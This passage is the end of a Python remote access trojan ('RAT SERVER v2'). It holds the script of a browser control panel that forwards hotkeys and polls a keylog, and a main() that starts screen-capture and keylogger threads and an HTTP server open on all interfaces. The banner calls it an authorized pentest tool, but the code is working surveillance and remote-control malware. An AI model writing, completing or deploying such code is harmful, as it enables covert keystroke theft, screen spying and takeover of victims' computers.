            document.body.innerHTML = '<div style="display:flex;height:100vh;align-items:center;justify-content:center;flex-direction:column;background:#0a0a0f;color:#e74c3c;font-family:sans-serif;"><h1>Server Shut Down</h1><p style="color:#888;margin-top:10px;">The remote access server has been terminated.</p></div>';
        }});
    }}
}}

// ── Periodic refresh ──
setInterval(fetchKeylog, 1500);

// ── Start ──
startStream();

// Keyboard passthrough
document.addEventListener('keydown', function(e) {{
    if (e.ctrlKey && e.key === 'c') {{ sendHotkey(['ctrl','c']); e.preventDefault(); }}
    if (e.ctrlKey && e.key === 'v') {{ sendHotkey(['ctrl','v']); e.preventDefault(); }}
    if (e.ctrlKey && e.key === 'a') {{ sendHotkey(['ctrl','a']); e.preventDefault(); }}
    if (e.key === 'F5') {{ e.preventDefault(); }}
    if (e.key === 'F12') {{ e.preventDefault(); }}
}});
</script>
</body>
</html>"""


# ─── Start Server ────────────────────────────────────────────────────────────

def main():
    show_warning()
    init_display_info()

    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    print("=" * 60)
    print("  RAT SERVER v2 — Multi-Monitor — Authorized Pentest Tool")
    print("=" * 60)
    print(f"  Server:    http://{local_ip}:{PORT}")
    print(f"  Local:     http://127.0.0.1:{PORT}")
    print(f"  Password:  {PANEL_PASSWORD}")
    print(f"  Monitors:  {len(MONITORS_INFO)}")
    print(f"  Virtual:   {VIRTUAL_WIDTH}x{VIRTUAL_HEIGHT}")
    print(f"")
    print(f"  Open in any browser on same network to control.")
    print(f"  Press Ctrl+C to stop.")
    print("=" * 60)

    # Start screen capture
    threading.Thread(target=screen_capture_loop, daemon=True).start()
    # Start keylogger
    threading.Thread(target=keylog_loop, daemon=True).start()

    time.sleep(0.5)

    server = HTTPServer(("0.0.0.0", PORT), RATHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped by user.")
        server.shutdown()


if __name__ == "__main__":
    if os.name != "nt":
        print("[!] Some features require Windows (mouse/keyboard APIs).")
    main()